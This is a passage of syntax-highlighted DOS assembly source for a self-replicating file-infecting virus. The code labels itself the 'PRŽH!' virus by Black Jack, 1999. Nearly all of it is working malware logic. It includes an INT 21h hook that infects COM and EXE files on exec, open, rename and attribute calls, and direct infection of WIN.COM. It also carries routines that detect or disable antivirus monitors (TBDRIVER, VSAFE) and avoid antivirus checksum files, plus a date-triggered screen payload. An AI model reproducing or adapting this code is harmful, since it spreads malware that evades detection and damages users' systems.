    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">copy_windir_head</span><span class="sc0">            </span><span class="sc1">; copy filename till zero</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                          </span><span class="sc1">; we don't want the final zero</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">win_file</span><span class="sc0">         </span><span class="sc1">; and copy "\WIN.COM" to the windir</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">                       </span><span class="sc1">; length of "\WIN.COM", 0</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                       </span><span class="sc1">; copy it!</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4300h</span><span class="sc0">                   </span><span class="sc1">; get attrib (to infect)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    
</span><span class="sc5">end_getwin</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; ----- END DIRECT INFECTION ------------------------------------------------</span><span class="sc0">

</span><span class="sc5">return</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">; BACK TO HOST PROGRAM</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Ah</span><span class="sc0">                     </span><span class="sc1">; GET DATE</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">091Bh</span><span class="sc0">                   </span><span class="sc1">; 27.September</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">no_payload</span><span class="sc0">

</span><span class="sc1">; ----- PAYLOAD -------------------------------------------------------------</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                       </span><span class="sc1">; set video mode 40x25</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                       </span><span class="sc1">; remove blinking cursor</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0110000000000000b</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1300h</span><span class="sc0">                   </span><span class="sc1">; print string</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10001100b</span><span class="sc0">               </span><span class="sc1">; attribute</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                       </span><span class="sc1">; length of string</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc4">*</span><span class="sc2">100h</span><span class="sc4">+</span><span class="sc2">17</span><span class="sc0">              </span><span class="sc1">; start position</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">prah</span><span class="sc0">             </span><span class="sc1">; ES:BP=offset string</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

</span><span class="sc5">waitkbhitloop</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">; wait until user presses some key</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                       </span><span class="sc1">; key pressed?</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">16h</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">waitkbhitloop</span><span class="sc0">                </span><span class="sc1">; if not, then repeat</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; remove key out of keyboard buffer</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">16h</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                       </span><span class="sc1">; set standart 80x25 video mode</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                       </span><span class="sc1">; restore regular cursor</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0607h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

</span><span class="sc1">; ----- END PAYLOAD ---------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">no_payload</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">entry_segm</span><span class="sc0">              </span><span class="sc1">; correct far-jump</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">entry_segm</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                           </span><span class="sc1">; clear prefetch queue</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc0">                      </span><span class="sc1">; correct original stack segment</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">orig_ss</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">orig_ss</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                          </span><span class="sc1">; restore registers</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">popa</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                          </span><span class="sc1">; this will make EXEPACKed files run, but why?!</span><span class="sc0">
    </span><span class="sc6">popf</span><span class="sc0">

    </span><span class="sc6">cli</span><span class="sc0">                             </span><span class="sc1">; restore stack</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">orig_ss</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">orig_sp</span><span class="sc0">
    </span><span class="sc6">sti</span><span class="sc0">

</span><span class="sc5">entry_point</span><span class="sc4">:</span><span class="sc0">                            </span><span class="sc1">; JUMP TO HOST</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc0">                      </span><span class="sc1">; op-code far-jump</span><span class="sc0">
</span><span class="sc5">entry_offs</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">              </span><span class="sc1">; offset</span><span class="sc0">
</span><span class="sc5">entry_segm</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">host_seg</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc4">)/</span><span class="sc2">16</span><span class="sc0"> </span><span class="sc1">; segment</span><span class="sc0">

</span><span class="sc5">orig_sp</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_sp</span><span class="sc0">
</span><span class="sc5">orig_ss</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">restore_com</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushf</span><span class="sc0">                           </span><span class="sc1">; save register</span><span class="sc0">
    </span><span class="sc6">pusha</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                         </span><span class="sc1">; set DS:SI to original file start</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">org_com_start</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">                    </span><span class="sc1">; set ES:DI to entry point</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">com_start_l</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                       </span><span class="sc1">; move original start back</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                      </span><span class="sc1">; relocate far-jump</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">entry_segm</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">entry_offs</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; restore register</span><span class="sc0">
    </span><span class="sc6">popa</span><span class="sc0">
    </span><span class="sc6">popf</span><span class="sc0">

    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">entry_point</span><span class="sc0">           </span><span class="sc1">; jumpt to far-jump</span><span class="sc0">

</span><span class="sc1">; ***** STRING CONSTANTS ****************************************************</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"This is the ["</span><span class="sc0">
</span><span class="sc5">prah</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"PRŽH!] virus, written and (c) by Black Jack, 1999"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">anti_vir_dat</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"ANTI-VIR.DAT"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">chklist_ms</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CHKLIST.MS"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">chklist_cps</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CHKLIST.CPS"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">avp_crc</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"AVP.CRC"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">tbdriver</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"TBDRVXXX"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">dont_infect</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"AVDRTBF-FINOSC"</span><span class="sc0">

</span><span class="sc5">win_path</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"C:\WINDOWS"</span><span class="sc0">
</span><span class="sc5">win_file</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"\WIN.COM"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">windir</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"windir="</span><span class="sc0">

</span><span class="sc1">; ***** ROUTINES ************************************************************</span><span class="sc0">

</span><span class="sc1">; ----- INT 24h HANDLER -----------------------------------------------------</span><span class="sc0">

</span><span class="sc5">int24_handler</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">sti</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc1">; ----- END INT 24h HANDLER -------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; ----- INT 21h HANDLER -----------------------------------------------------</span><span class="sc0">

</span><span class="sc5">int21_handler</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ping</span><span class="sc0">                    </span><span class="sc1">; Are-you-there function</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">not_see_if_there</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pong</span><span class="sc0">
    </span><span class="sc6">IRET</span><span class="sc0">
    
</span><span class="sc5">not_see_if_there</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"JB"</span><span class="sc0">                    </span><span class="sc1">; to avoid endless recursions</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">exit_hook</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Bh</span><span class="sc0">                     </span><span class="sc1">; EXEC-function</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">not_exec</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">infect</span><span class="sc0">
</span><span class="sc5">not_exec</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Dh</span><span class="sc0">                     </span><span class="sc1">; open file</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">not_open</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">infect</span><span class="sc0">
</span><span class="sc5">not_open</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">                     </span><span class="sc1">; get/set attribs</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">not_attr</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">infect</span><span class="sc0">
</span><span class="sc5">not_attr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">56h</span><span class="sc0">                     </span><span class="sc1">; rename/move file</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">not_rename</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">infect</span><span class="sc0">
</span><span class="sc5">not_rename</span><span class="sc4">:</span><span class="sc0">     
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6Ch</span><span class="sc0">                     </span><span class="sc1">; extended file-open</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">exit_hook</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                     </span><span class="sc1">; this function wants the filename in</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infect</span><span class="sc0">                     </span><span class="sc1">; DS:SI</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">exit_hook</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">org_int21</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">; ----- END HOOK ------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">; INFECTION ROUTINE</span><span class="sc0">
    </span><span class="sc6">pusha</span><span class="sc0">                           </span><span class="sc1">; save registers</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">fn_offs</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">fn_segm</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">                     </span><span class="sc1">; save old dta addres</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                         </span><span class="sc1">; save old dta address to stack</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                         </span><span class="sc1">; save DS:DX (pointer to filename)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Ah</span><span class="sc0">                     </span><span class="sc1">; set new dta address</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dta</span><span class="sc0">              </span><span class="sc1">; DS:DX=pointer to new dta</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                          </span><span class="sc1">; restore DS:DX (pointer to filename)</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Eh</span><span class="sc0">                     </span><span class="sc1">; call findfirst function</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000000000100111b</span><span class="sc0">       </span><span class="sc1">; CX = attrib</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                          </span><span class="sc1">; get old dta address from stack</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Ah</span><span class="sc0">                     </span><span class="sc1">; set dta back</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                         </span><span class="sc1">; DS = CS</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                         </span><span class="sc1">; ES = CS</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

                    </span><span class="sc1">; OPEN TBDRVXXX</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D00h</span><span class="sc0">                   </span><span class="sc1">; open read only</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tbdriver</span><span class="sc0">         </span><span class="sc1">; DS:DX=Pointer to filename</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"JB"</span><span class="sc0">                    </span><span class="sc1">; avoid endless recursions</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">JC</span><span class="sc0"> </span><span class="sc5">no_tbdrv_res</span><span class="sc0">                 </span><span class="sc1">; if error, no TBDRIVER found =&gt; OK</span><span class="sc0">
    
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                     </span><span class="sc1">; handle to bx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">                     </span><span class="sc1">; Close file again</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; call dos</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">exit_before_open</span><span class="sc0">            </span><span class="sc1">; get outta here to avoid detection!</span><span class="sc0">
    
</span><span class="sc5">no_tbdrv_res</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FA01h</span><span class="sc0">                  </span><span class="sc1">; Disable VSAFE</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05945h</span><span class="sc0">                  </span><span class="sc1">; just a joke...</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">16h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0">                      </span><span class="sc1">; search file name for extension</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fname</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"."</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">                     </span><span class="sc1">; search for the dot</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"OC"</span><span class="sc0">         </span><span class="sc1">; .COM - file?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">extention_exe</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"M"</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">extention_ok</span><span class="sc0">
</span><span class="sc5">extention_exe</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">; .EXE - file?</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"XE"</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">exit_before_open</span><span class="sc0">
